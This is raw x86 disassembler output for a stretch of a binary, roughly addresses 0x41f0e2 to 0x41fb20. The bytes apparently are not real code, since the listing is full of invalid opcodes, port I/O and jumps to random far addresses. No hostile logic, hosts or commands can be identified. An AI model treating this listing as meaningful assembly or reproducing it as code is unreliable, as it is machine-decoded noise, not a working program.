  41f0e2:	adc    DWORD PTR [ebx+ebx*2+0x3f686fa3],eax
  41f0e9:	call   0xa61f1b5c
  41f0ee:	fsubr  QWORD PTR [edi]
  41f0f0:	or     esp,DWORD PTR [ecx+0x652d3a45]
  41f0f6:	addr16 mov cs,esp
  41f0f9:	jno    0x41f168
  41f0fb:	aas    
  41f0fc:	dec    eax
  41f0fd:	cmp    BYTE PTR [ebp+esi*1-0x7e],0x41
  41f102:	push   ebp
  41f103:	pop    ss
  41f104:	fsubr  DWORD PTR [edx]
  41f106:	mov    ah,BYTE PTR [edi]
  41f108:	in     eax,dx
  41f109:	inc    edx
  41f10a:	(bad)  
  41f10b:	mov    ds:0x970e03dc,al
  41f110:	lock add BYTE PTR [eax],al
	...
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0xdda4e5f2
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0xb5000001
  41f18d:	adc    al,0x7f
  41f18f:	lahf   
  41f190:	in     eax,dx
  41f191:	iret   
  41f192:	push   cs
  41f193:	and    eax,0xd9a6e34e
  41f198:	and    al,0x9f
  41f19a:	pusha  
  41f19b:	je     0x41f20b
  41f19d:	out    dx,al
  41f19e:	std    
  41f19f:	sub    dh,bh
  41f1a1:	stc    
  41f1a2:	popf   
  41f1a3:	lods   eax,DWORD PTR ds:[esi]
  41f1a4:	jb     0x41f188
  41f1a6:	push   0x5d
  41f1a8:	or     esp,DWORD PTR [ebx-0xa]
  41f1ab:	dec    bl
  41f1ad:	mov    al,ds:0x920e6102
  41f1b2:	cmc    
  41f1b3:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41f1b5:	cmp    DWORD PTR [edx-0x8],eax
  41f1b8:	xchg   edx,eax
  41f1b9:	dec    ebp
  41f1ba:	mov    al,ds:0xb58cf603
  41f1bf:	jne    0x41f196
  41f1c1:	es ins BYTE PTR es:[edi],dx
  41f1c3:	in     eax,dx
  41f1c4:	sbb    DWORD PTR [eax],esi
  41f1c6:	ja     0x41f240
  41f1c8:	mov    bl,0xea
  41f1ca:	pop    esi
  41f1cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1cc:	pop    esp
  41f1cd:	into   
  41f1ce:	into   
  41f1cf:	popf   
  41f1d0:	or     BYTE PTR [edi+0x775bf342],cl
  41f1d6:	cmp    esp,DWORD PTR [esi-0x71]
  41f1d9:	iret   
  41f1da:	dec    ebx
  41f1db:	sbb    BYTE PTR [esi-0x14],dl
  41f1de:	and    dl,BYTE PTR [ecx+0x6f]
  41f1e1:	and    bl,0x36
  41f1e4:	xchg   esi,eax
  41f1e5:	adc    edx,DWORD PTR [ecx]
  41f1e7:	jecxz  0x41f16b
  41f1e9:	cmp    BYTE PTR [ebp+0x7ce9171b],cl
  41f1ef:	push   esp
  41f1f0:	mov    esp,0xf7926e9d
  41f1f5:	addr16 push 0xffffffce
  41f1f8:	cmp    BYTE PTR [edi+ebx*8+0x26],ch
  41f1fc:	mov    eax,ds:0x729dbebf
  41f201:	imul   ecx,DWORD PTR [edi-0x5dcdbea6],0xa9e38aac
  41f20b:	adc    al,0x75
  41f20d:	cmp    eax,0xbf5d709c
  41f212:	sbb    eax,0x1dc4a4c4
  41f217:	dec    esp
  41f218:	cwde   
  41f219:	ret    0xba81
  41f21c:	cs or  eax,0x8c363ea2
  41f222:	cwde   
  41f223:	xor    DWORD PTR [edi],esp
  41f225:	lahf   
  41f226:	cmp    edi,0x9d13b3c4
  41f22c:	lock cmp eax,ebx
  41f22f:	push   eax
  41f230:	jbe    0x41f1e9
  41f232:	fistp  QWORD PTR [ecx-0x67]
  41f235:	push   0xffffff89
  41f237:	and    eax,0x73a3932f
  41f23c:	pop    ebp
  41f23d:	call   0x8287:0xe200cd21
  41f244:	pusha  
  41f245:	jecxz  0x41f22a
  41f247:	dec    esp
  41f248:	mov    ah,al
  41f24a:	adc    bl,BYTE PTR [eax+0x3c1c7e29]
  41f250:	adc    BYTE PTR [edi],dl
  41f252:	push   0x26312c
  41f257:	out    dx,eax
  41f258:	mov    ebx,0x62d706d3
  41f25d:	adc    al,0x61
  41f25f:	jge    0x41f23b
  41f261:	loopne 0x41f29d
  41f263:	aam    0xb1
  41f265:	sahf   
  41f266:	cmp    DWORD PTR [edi],ebx
  41f268:	adc    DWORD PTR [eax+edx*1+0x681faffc],0xfffffffb
  41f270:	xor    dl,ah
  41f272:	and    edi,DWORD PTR [eax-0x3e260a7c]
  41f278:	aad    0x16
  41f27a:	mov    DWORD PTR [ebx],ebx
  41f27c:	es aaa 
  41f27e:	imul   eax,DWORD PTR [ebp-0x439e03ab],0xffffffbc
  41f285:	jb     0x41f2c6
  41f287:	addr16 pop edx
  41f289:	cmp    al,0x71
  41f28b:	push   ecx
  41f28c:	ja     0x41f238
  41f28e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f28f:	add    BYTE PTR [eax+0x0],dh
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f374
  41f301:	and    esi,DWORD PTR [esi+0x14c348e]
  41f307:	add    BYTE PTR ds:0x48000001,al
  41f30d:	inc    esp
  41f30e:	inc    BYTE PTR ds:0x203adef6
  41f314:	jmp    0xf00a8c52
  41f319:	mov    dl,0x6b
  41f31b:	xor    DWORD PTR [eax*1+0x5f9904bf],ebx
  41f322:	outs   dx,BYTE PTR ds:[esi]
  41f323:	xchg   esp,eax
  41f324:	(bad)  
  41f325:	sbb    BYTE PTR [esi+eax*4],dh
  41f328:	sbb    dh,BYTE PTR [ebx+0x1c3a0195]
  41f32e:	cld    
  41f32f:	cmp    BYTE PTR [esi+ecx*2],0x87
  41f333:	adc    al,0x10
  41f335:	stos   BYTE PTR es:[edi],al
  41f336:	imul   ebp,DWORD PTR ds:[esi],0x524ce2f7
  41f33d:	ja     0x41f3a4
  41f33f:	push   es
  41f340:	mov    dh,0x94
  41f342:	imul   eax,DWORD PTR [eax+0x4d],0xffffffb2
  41f346:	fwait
  41f347:	dec    ecx
  41f348:	push   esi
  41f349:	call   0x8d3d2ff
  41f34e:	mov    ecx,0xed2a2810
  41f353:	test   DWORD PTR [esi],esi
  41f355:	popf   
  41f356:	outs   dx,BYTE PTR ds:[esi]
  41f357:	std    
  41f358:	pusha  
  41f359:	jmp    0x1acf3796
  41f35e:	lahf   
  41f35f:	data16 mov bl,0x80
  41f362:	jno    0x41f36c
  41f364:	cmp    ebx,edi
  41f366:	repnz and eax,0x53c0d5ba
  41f36c:	fsub   QWORD PTR [edx+eax*2-0x51]
  41f370:	loop   0x41f3b1
  41f372:	out    0xa5,al
  41f374:	xchg   ebp,eax
  41f375:	sbb    al,0xa1
  41f377:	sub    ecx,DWORD PTR [ecx+0x4fb6d4b7]
  41f37d:	imul   ebx,DWORD PTR [edi-0x3efc9d79],0x3984627e
  41f387:	push   ss
  41f388:	stc    
  41f389:	mov    eax,ds:0xd027d3ad
  41f38e:	sbb    eax,DWORD PTR [ebx]
  41f390:	sub    eax,0x7f9d1c87
  41f395:	and    eax,DWORD PTR [ecx-0x5488bf4b]
  41f39b:	mov    al,0x27
  41f39d:	push   ebx
  41f39e:	sbb    ch,BYTE PTR [esi]
  41f3a0:	jge    0x41f3bd
  41f3a2:	arpl   WORD PTR [ebx],bp
  41f3a4:	aam    0x90
  41f3a6:	add    esp,DWORD PTR [edi-0x3f167b69]
  41f3ac:	in     eax,0xf6
  41f3ae:	ins    BYTE PTR es:[edi],dx
  41f3af:	ret    0x90c
  41f3b2:	xchg   edi,eax
  41f3b3:	sub    DWORD PTR [edx+0x51],0xdf6c534b
  41f3ba:	jo     0x41f379
  41f3bc:	pop    esi
  41f3bd:	jnp    0x41f35d
  41f3bf:	mov    eax,ds:0x3a2b6ea3
  41f3c4:	lahf   
  41f3c5:	mov    bl,0x8a
  41f3c7:	imul   esp,DWORD PTR es:[eax],0x498e83c8
  41f3ce:	adc    eax,0x184e0e9d
  41f3d3:	sub    eax,0xe239024d
  41f3d8:	cmp    ecx,DWORD PTR [edi+0x4e]
  41f3db:	fbstp  TBYTE PTR ds:0xe66a50d0
  41f3e1:	fadd   st(0),st
  41f3e3:	(bad)  
  41f3e6:	inc    edx
  41f3e7:	dec    ebp
  41f3e8:	loope  0x41f3c4
  41f3ea:	mov    bh,0x6f
  41f3ec:	cld    
  41f3ed:	sub    bh,cl
  41f3ef:	test   DWORD PTR [edi],ebp
  41f3f1:	nop
  41f3f2:	out    dx,eax
  41f3f3:	in     al,0xd8
  41f3f5:	outs   dx,DWORD PTR ds:[esi]
  41f3f6:	or     esp,DWORD PTR [edx+ecx*1-0x4]
  41f3fa:	mov    esp,0xa982ff39
  41f3ff:	je     0x41f443
  41f401:	stos   DWORD PTR es:[edi],eax
  41f402:	imul   ebp,DWORD PTR [edx],0xffffffba
  41f405:	xor    al,0x6f
  41f407:	jl     0x41f3e3
  41f409:	pop    esp
  41f40a:	cmp    edi,ebx
  41f40c:	retf   0x1468
  41f40f:	fbstp  TBYTE PTR [esi+0x0]
	...
  41f472:	add    BYTE PTR [eax],al
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x48
  41f481:	mov    al,BYTE PTR [esi-0x47]
  41f484:	cmp    DWORD PTR [ebp+0x1],ecx
  41f487:	add    BYTE PTR ds:0x94000001,al
  41f48d:	dec    edi
  41f48e:	jb     0x41f4a6
  41f490:	inc    ecx
  41f491:	outs   dx,BYTE PTR ds:[esi]
  41f492:	pop    esi
  41f493:	popa   
  41f494:	shl    bl,cl
  41f496:	adc    eax,0xd437edb2
  41f49b:	mov    ds:0x34aab90e,al
  41f4a0:	fistp  WORD PTR [eax+0x6e724b54]
  41f4a6:	cwde   
  41f4a7:	shl    DWORD PTR [esi-0x5a70ee64],0x27
  41f4ae:	outs   dx,BYTE PTR ds:[esi]
  41f4af:	les    edx,FWORD PTR [esi-0x6a]
  41f4b2:	dec    ecx
  41f4b3:	out    0xac,al
  41f4b5:	ror    BYTE PTR [ecx+0x5c6c8b00],cl
  41f4bb:	std    
  41f4bc:	repz sbb esp,DWORD PTR [ecx]
  41f4bf:	popf   
  41f4c0:	add    eax,DWORD PTR [edi-0x1d]
  41f4c3:	iret   
  41f4c4:	mov    al,ds:0xb3aa354d
  41f4c9:	sbb    esp,DWORD PTR [edi+esi*4]
  41f4cc:	inc    esi
  41f4cd:	(bad)  
  41f4ce:	sbb    al,0x26
  41f4d0:	pop    edx
  41f4d1:	leave  
  41f4d2:	dec    esi
  41f4d3:	ret    0x2a4e
  41f4d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4d7:	sub    cl,BYTE PTR [eax+0x74718608]
  41f4dd:	cmp    al,0xd2
  41f4df:	push   ss
  41f4e0:	cdq    
  41f4e1:	cwde   
  41f4e2:	jg     0x41f4de
  41f4e4:	jns    0x41f4a9
  41f4e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4e7:	sbb    cl,BYTE PTR [esi+esi*8-0x3819170a]
  41f4ee:	add    DWORD PTR [ecx-0x3],0x7
  41f4f2:	push   ebp
  41f4f3:	test   DWORD PTR [ebp-0x71],esp
  41f4f6:	int    0x8a
  41f4f8:	int    0xe0
  41f4fa:	sub    edx,0xfffffff7
  41f4fd:	lods   al,BYTE PTR ds:[esi]
  41f4fe:	(bad)  
  41f4ff:	jnp    0x41f49c
  41f501:	jno    0x41f4fd
  41f503:	ret    
  41f504:	mov    ebp,0xe2bd3152
  41f509:	sbb    eax,0x41e6e2bf
  41f50e:	loop   0x41f4ab
  41f510:	fwait
  41f511:	in     al,dx
  41f512:	jp     0x41f4f9
  41f514:	xchg   edx,eax
  41f515:	loopne 0x41f4c9
  41f517:	mov    esp,0xc05fa856
  41f51c:	lock xchg BYTE PTR [eax+ebx*2],bl
  41f520:	enter  0xf942,0x1c
  41f524:	fwait
  41f525:	cli    
  41f526:	pop    ebx
  41f527:	pushf  
  41f528:	mov    ecx,0xa79e7663
  41f52d:	adc    al,0x56
  41f52f:	fmul   QWORD PTR [ecx+0x3e141197]
  41f535:	add    eax,0xc593e394
  41f53a:	jp     0x41f54b
  41f53c:	ret    0x9467
  41f53f:	mov    edx,0xb56f8e73
  41f544:	mov    ds:0x180ca57e,al
  41f549:	jne    0x41f57b
  41f54b:	sbb    eax,0xfdbc5e3b
  41f550:	dec    ecx
  41f551:	inc    edx
  41f552:	sub    edi,DWORD PTR [eax-0x37efaacb]
  41f558:	mov    BYTE PTR [eax-0x106e851d],ah
  41f55e:	into   
  41f55f:	mov    dl,0x40
  41f561:	test   bl,dh
  41f563:	in     al,0x93
  41f565:	mov    eax,0xf7be1b64
  41f56a:	(bad)  
  41f56b:	fcmovnb st,st(5)
  41f56d:	xlat   BYTE PTR ds:[ebx]
  41f56e:	xlat   BYTE PTR ds:[ebx]
  41f56f:	dec    edi
  41f570:	rcl    DWORD PTR [esi+0x15],0x78
  41f574:	jb     0x41f5d1
  41f576:	aad    0x50
  41f578:	jle    0x41f5be
  41f57a:	adc    edi,DWORD PTR [edi+0x8e51019]
  41f580:	cmp    eax,0x8320f11e
  41f585:	test   DWORD PTR ss:[ebp+0x2e],0xe2ccc62c
  41f58d:	sbb    eax,0x4802d5
	...
  41f5f2:	add    BYTE PTR [eax],al
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x61:0x86bd422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0xbe000001
  41f60d:	fsub   QWORD PTR [eax+0x7b]
  41f610:	pusha  
  41f611:	sbb    BYTE PTR [edx+ebp*4+0x40],dh
  41f615:	push   esi
  41f616:	sub    eax,0xfb3b7c51
  41f61b:	jmp    0x667e:0xd0b77e4a
  41f622:	rcr    ecx,cl
  41f624:	fmul   DWORD PTR [edx+0x16b398d4]
  41f62a:	imul   esp,esi,0x9aa3ce80
  41f630:	inc    ecx
  41f631:	nop
  41f632:	inc    esp
  41f633:	ret    0x96a1
  41f636:	push   ebp
  41f637:	test   eax,0xfa09d74c
  41f63c:	jmp    0x2df1:0xcf68805a
  41f643:	pop    ebp
  41f644:	pusha  
  41f645:	jb     0x41f626
  41f647:	push   edx
  41f648:	jecxz  0x41f65e
  41f64a:	jg     0x41f619
  41f64c:	mov    si,0xc068
  41f650:	xchg   edx,eax
  41f651:	dec    edi
  41f652:	sbb    esi,DWORD PTR [eax+0x1c67e914]
  41f658:	das    
  41f659:	jno    0x41f627
  41f65b:	dec    eax
  41f65c:	jb     0x41f6ae
  41f65e:	or     bh,BYTE PTR [ecx-0x7]
  41f661:	push   edi
  41f662:	xchg   esp,eax
  41f663:	popa   
  41f664:	fsub   st(4),st
  41f666:	out    dx,eax
  41f667:	sahf   
  41f668:	(bad)  
  41f669:	dec    DWORD PTR [esi+0x78]
  41f66c:	inc    ecx
  41f66d:	mov    ah,0x56
  41f66f:	imul   ecx,DWORD PTR [edx+0x29],0x1c678efb
  41f676:	fstp   QWORD PTR [ebp-0x3f]
  41f679:	mov    ch,0xb3
  41f67b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f67c:	out    dx,al
  41f67d:	inc    esi
  41f67e:	xchg   ecx,eax
  41f67f:	push   esi
  41f680:	daa    
  41f681:	xor    eax,0xf8b7d53f
  41f686:	loope  0x41f6d2
  41f688:	jo     0x41f6bc
  41f68a:	(bad)  
  41f68b:	cs dec eax
  41f68d:	pop    esp
  41f68e:	jno    0x41f702
  41f690:	lea    ebp,[edi+0x17cefc73]
  41f696:	dec    ebp
  41f697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f698:	retf   
  41f699:	mov    esi,0x27b91fe
  41f69e:	mov    bh,0xa2
  41f6a0:	push   edx
  41f6a1:	or     BYTE PTR [esi+0x66],0xa1
  41f6a5:	push   0xffffffb0
  41f6a7:	std    
  41f6a8:	push   esi
  41f6a9:	div    dl
  41f6ab:	dec    ebx
  41f6ac:	je     0x41f683
  41f6ae:	cdq    
  41f6af:	jno    0x41f718
  41f6b1:	(bad)  
  41f6b2:	fdivrp st(5),st
  41f6b4:	sub    BYTE PTR [esi],cl
  41f6b6:	pop    ss
  41f6b7:	imul   esp,DWORD PTR [ebp-0x69a185f0],0xffffffcf
  41f6be:	adc    bh,dl
  41f6c0:	addr16 jmp 0xe8af3c40
  41f6c6:	jno    0x41f6c5
  41f6c8:	int    0x29
  41f6ca:	icebp  
  41f6cb:	aas    
  41f6cc:	mov    ebx,0x715729ec
  41f6d1:	dec    esp
  41f6d2:	mov    edi,es
  41f6d4:	jmp    0x2403416f
  41f6d9:	jmp    0x70b48eb6
  41f6de:	scas   al,BYTE PTR es:[edi]
  41f6df:	xchg   BYTE PTR gs:[eax+0x6285e016],ch
  41f6e6:	dec    eax
  41f6e7:	cmp    esp,DWORD PTR [esi+ecx*4]
  41f6ea:	dec    esp
  41f6eb:	xchg   DWORD PTR [ecx],ecx
  41f6ed:	sub    eax,0xc56aea70
  41f6f2:	xor    edi,ebp
  41f6f4:	dec    ebx
  41f6f5:	int    0xe7
  41f6f7:	sub    edi,edx
  41f6f9:	jae    0x41f691
  41f6fb:	fild   WORD PTR [ebp+ecx*4-0x3f82b204]
  41f702:	pop    ds
  41f703:	fdiv   DWORD PTR [ecx+0x16]
  41f706:	fstp   st(7)
  41f708:	jno    0x41f6c1
  41f70a:	scas   al,BYTE PTR es:[edi]
  41f70b:	dec    edi
  41f70c:	arpl   WORD PTR [edx],cx
  41f70e:	xchg   ecx,eax
  41f70f:	fcomi  st,st(4)
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x1a96:0x316c62d2
  41f783:	xchg   edi,eax
  41f784:	inc    ebx
  41f785:	dec    edi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0x22000001
  41f78d:	mov    DWORD PTR ds:[eax+0x19],ebx
  41f791:	mov    ds:0x4c7c09d9,eax
  41f796:	inc    ebx
  41f797:	mov    cl,0x96
  41f799:	stos   BYTE PTR es:[edi],al
  41f79a:	jmp    0x5f92:0xbc730e10
  41f7a1:	pusha  
  41f7a2:	jae    0x41f7e1
  41f7a4:	jb     0x41f7c0
  41f7a6:	sbb    al,0x3d
  41f7a8:	fild   QWORD PTR [edi+0x53]
  41f7ab:	adc    ah,ch
  41f7ad:	mov    WORD PTR [ecx+0x43],?
  41f7b0:	ins    BYTE PTR es:[edi],dx
  41f7b1:	adc    al,0x10
  41f7b3:	ds aad 0xe8
  41f7b6:	mov    edi,0x72729cfb
  41f7bb:	or     cl,BYTE PTR [ecx]
  41f7bd:	xor    DWORD PTR [edi],0xa91f0e0c
  41f7c3:	mov    bl,BYTE PTR [edx+esi*4-0x54168004]
  41f7ca:	test   al,0x4e
  41f7cc:	(bad)  
  41f7cd:	adc    DWORD PTR [eax-0x26],edx
  41f7d0:	daa    
  41f7d1:	por    mm0,mm1
  41f7d4:	pop    eax
  41f7d5:	rcr    BYTE PTR [esi+0x4],cl
  41f7d8:	cmp    bl,ah
  41f7da:	push   ss
  41f7db:	cmc    
  41f7dc:	test   dl,0xbf
  41f7df:	jge    0x41f77b
  41f7e1:	clc    
  41f7e2:	cmp    eax,DWORD PTR [eax+0x4a]
  41f7e5:	push   ds
  41f7e6:	ins    BYTE PTR es:[edi],dx
  41f7e7:	mov    cs,WORD PTR [esi+0x3b]
  41f7ea:	loope  0x41f7f3
  41f7ec:	je     0x41f81c
  41f7ee:	or     ch,ah
  41f7f0:	inc    DWORD PTR [edx]
  41f7f2:	inc    esp
  41f7f3:	icebp  
  41f7f4:	nop
  41f7f5:	mov    cl,0x84
  41f7f7:	scas   al,BYTE PTR es:[edi]
  41f7f8:	inc    esi
  41f7f9:	sbb    eax,0x27f3b666
  41f7fe:	loop   0x41f7e7
  41f800:	push   ss
  41f801:	(bad)  
  41f802:	adc    cl,cl
  41f804:	inc    esi
  41f805:	test   eax,0x11a80e17
  41f80a:	clc    
  41f80b:	cmp    eax,eax
  41f80d:	add    al,0xe
  41f80f:	xor    eax,0x92d45e23
  41f814:	int3   
  41f815:	int    0xa
  41f817:	stos   BYTE PTR es:[edi],al
  41f818:	scas   al,BYTE PTR es:[edi]
  41f819:	and    di,WORD PTR [edx]
  41f81c:	add    ecx,DWORD PTR [ebp+0x21970a09]
  41f822:	or     eax,0x83479511
  41f827:	pop    ebp
  41f828:	into   
  41f829:	dec    edx
  41f82a:	pop    esi
  41f82b:	dec    eax
  41f82c:	lea    edi,[edi-0x2704acff]
  41f832:	int    0x3e
  41f834:	fwait
  41f835:	imul   ebp,edi,0x48e6211
  41f83b:	dec    edx
  41f83c:	fnstsw WORD PTR [edi-0x1985aad0]
  41f842:	das    
  41f843:	mov    ecx,0x1e9221ec
  41f848:	jmp    0x70067db8
  41f84d:	mov    dl,0x16
  41f84f:	jmp    0x3e489697
  41f854:	mov    bh,0xa5
  41f856:	fisubr DWORD PTR [ebx-0x6e3d2ba6]
  41f85c:	(bad)  
  41f85d:	fwait
  41f85e:	leave  
  41f85f:	fnsave [eax-0x70]
  41f862:	dec    esi
  41f863:	mov    edi,0xd82e2023
  41f868:	push   ebx
  41f869:	es iret 
  41f86b:	add    ch,BYTE PTR [edi+0x0]
  41f86e:	or     eax,0x523d4f19
  41f873:	fwait
  41f874:	sub    cl,cl
  41f876:	test   eax,0xf09fdcb2
  41f87b:	mov    dh,0xa
  41f87d:	in     eax,0x9
  41f87f:	push   ebp
  41f880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f881:	bound  edx,QWORD PTR [esi]
  41f883:	and    eax,0xc67782b8
  41f888:	lock lea ebx,[edi]
  41f88b:	aas    
  41f88c:	jbe    0x41f87d
  41f88e:	inc    edx
  41f88f:	out    dx,eax
  41f890:	cmp    BYTE PTR [eax],al
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	jne    0x41f8b6
  41f902:	push   ebp
  41f903:	xchg   edx,eax
  41f904:	dec    eax
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0x91000001
  41f90d:	imul   ecx,DWORD PTR [ebp-0x30702b83],0x6c8b2ac1
  41f917:	inc    edx
  41f918:	push   0x599a199b
  41f91d:	gs leave 
  41f91f:	int    0x20
  41f921:	popf   
  41f922:	and    al,0x45
  41f924:	jae    0x41f983
  41f926:	pop    es
  41f927:	jl     0x41f930
  41f929:	fnsave [edx-0x7c]
  41f92c:	jnp    0x41f8f1
  41f92e:	sbb    al,BYTE PTR [edi]
  41f930:	sbb    BYTE PTR [ebx+0x71],dl
  41f933:	mov    ah,0xde
  41f935:	gs iret 
  41f937:	mov    ds:0x4e03af1f,eax
  41f93c:	xor    dh,ah
  41f93e:	(bad)  
  41f93f:	cdq    
  41f940:	js     0x41f8f3
  41f942:	xchg   ebp,eax
  41f943:	ret    0x30da
  41f946:	mul    DWORD PTR [edx-0x4518f6b2]
  41f94c:	jge    0x41f912
  41f94e:	xchg   DWORD PTR [ecx+0x65f7493a],ecx
  41f954:	cmp    edi,edi
  41f956:	cwde   
  41f957:	sahf   
  41f958:	fwait
  41f959:	cmp    bl,BYTE PTR [esi+0x1d653388]
  41f95f:	push   ebp
  41f960:	leave  
  41f961:	jle    0x41f955
  41f963:	retf   
  41f964:	sbb    DWORD PTR [ebx],edi
  41f966:	cmp    DWORD PTR [edi],esp
  41f968:	mov    bh,0x42
  41f96a:	jbe    0x41f936
  41f96c:	mov    al,0xe0
  41f96e:	mov    bh,0xe8
  41f970:	jl     0x41f94b
  41f972:	je     0x41f9d8
  41f974:	lahf   
  41f975:	dec    esp
  41f976:	add    DWORD PTR [edi],eax
  41f978:	mov    dl,0x4a
  41f97a:	lahf   
  41f97b:	xchg   edi,eax
  41f97c:	scas   eax,DWORD PTR es:[edi]
  41f97d:	clc    
  41f97e:	push   ebp
  41f97f:	mov    esi,0x16b8a873
  41f984:	stos   BYTE PTR es:[edi],al
  41f985:	(bad)  
  41f986:	mov    ebp,0x484e829e
  41f98b:	cmc    
  41f98c:	fdivr  DWORD PTR [esi-0x5bfd3046]
  41f992:	imul   ebp,DWORD PTR [ecx+0x36],0xffffffeb
  41f996:	cmp    bh,dl
  41f998:	into   
  41f999:	mov    bh,0x59
  41f99b:	sub    eax,0xe26faddd
  41f9a0:	pusha  
  41f9a1:	pop    edx
  41f9a2:	adc    eax,0x410852c9
  41f9a7:	(bad)  
  41f9a8:	mov    dl,0x39
  41f9aa:	fstp   QWORD PTR [esi+0x3b77b887]
  41f9b0:	sub    BYTE PTR [ebp+0x38],dl
  41f9b3:	jmp    0xf8049236
  41f9b8:	les    esp,FWORD PTR [ebp-0x3b]
  41f9bb:	cld    
  41f9bc:	jmp    0xae0acfe0
  41f9c1:	imul   ebp,DWORD PTR [ecx],0xffffffbb
  41f9c4:	rol    BYTE PTR [eax+esi*1+0x4c],cl
  41f9c8:	or     ebx,ecx
  41f9ca:	cld    
  41f9cb:	cmp    BYTE PTR es:[edx+0x28],cl
  41f9cf:	clc    
  41f9d0:	outs   dx,BYTE PTR ds:[esi]
  41f9d1:	mov    esp,0x1fe3ad1d
  41f9d6:	(bad)  
  41f9d7:	jb     0x41fa36
  41f9d9:	outs   dx,BYTE PTR ds:[esi]
  41f9da:	aam    0x8a
  41f9dc:	aad    0x7f
  41f9de:	push   ss
  41f9df:	popf   
  41f9e0:	call   0x2fc55092
  41f9e5:	repz in al,0x5b
  41f9e8:	xchg   BYTE PTR [ecx],cl
  41f9ea:	daa    
  41f9eb:	adc    eax,0xb609691a
  41f9f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9f1:	retf   0xc140
  41f9f4:	push   esi
  41f9f5:	out    0x2d,al
  41f9f7:	mov    dl,0xed
  41f9f9:	mov    eax,es
  41f9fb:	adc    DWORD PTR [ebx],ebp
  41f9fd:	xchg   DWORD PTR [eax+0x39],edi
  41fa00:	dec    esi
  41fa01:	xchg   edi,eax
  41fa02:	es scas eax,DWORD PTR es:[edi]
  41fa04:	xor    edx,0xffffff8a
  41fa07:	and    bl,BYTE PTR [eax+0x34d9a157]
  41fa0d:	pusha  
  41fa0e:	xlat   BYTE PTR ds:[ebx]
  41fa0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa10:	stc    
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0x2aab0515,eax
  41fa83:	aaa    
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x4f000001
  41fa8d:	arpl   WORD PTR [ebx+0x43],bx
  41fa90:	xchg   DWORD PTR [ebx+0x20def892],edx
  41fa96:	pop    esp
  41fa97:	(bad)  
  41fa98:	(bad)  
  41fa99:	fwait
  41fa9a:	pop    ebx
  41fa9b:	inc    eax
  41fa9c:	jmp    0x41fa91
  41fa9e:	ffreep st(1)
  41faa0:	repnz adc eax,0x7daf33c0
  41faa6:	and    al,0xb
  41faa8:	cmp    esp,eax
  41faaa:	add    al,0x20
  41faac:	add    bl,al
  41faae:	pop    esp
  41faaf:	popa   
  41fab0:	xchg   DWORD PTR [ebx+eax*2],esi
  41fab3:	mov    ds:0x39f95458,al
  41fab8:	call   0xa34a00b9
  41fabd:	retf   0x1cf1
  41fac0:	ja     0x41fb40
  41fac2:	jle    0x41faa4
  41fac4:	and    al,0x6f
  41fac6:	jmp    0xf9c5:0x5f6ae1dd
  41facd:	js     0x41fb1b
  41facf:	or     eax,0x23f3a6b1
  41fad4:	shr    DWORD PTR ds:0x7550a36f,1
  41fada:	iret   
  41fadb:	push   ecx
  41fadc:	mov    cl,0xe8
  41fade:	pop    eax
  41fadf:	ds in  eax,0x1f
  41fae2:	pop    esi
  41fae3:	or     ax,0x292b
  41fae7:	add    dh,bl
  41fae9:	cmp    ecx,esi
  41faeb:	xchg   ebp,eax
  41faec:	xlat   BYTE PTR ds:[ebx]
  41faed:	stos   DWORD PTR es:[edi],eax
  41faee:	jbe    0x41fb01
  41faf0:	xchg   ebp,eax
  41faf1:	inc    ebp
  41faf2:	xchg   edx,eax
  41faf3:	add    esp,ecx
  41faf5:	fnsave [edi-0x7e]
  41faf8:	mov    es:0xd585fb66,al
  41fafe:	sub    edi,DWORD PTR [ebp+0x12]
  41fb01:	pop    esp
  41fb02:	call   0xf661:0xfb85af04
  41fb09:	jns    0x41fb5f
  41fb0b:	rcl    edx,1
  41fb0d:	adc    al,al
  41fb0f:	sub    ecx,0x70
  41fb12:	shr    BYTE PTR [esi],0xb1
  41fb15:	fld    TBYTE PTR [esi-0x5fa2412b]
  41fb1b:	mov    eax,0x70960656
  41fb20:	adc    al,0xaa
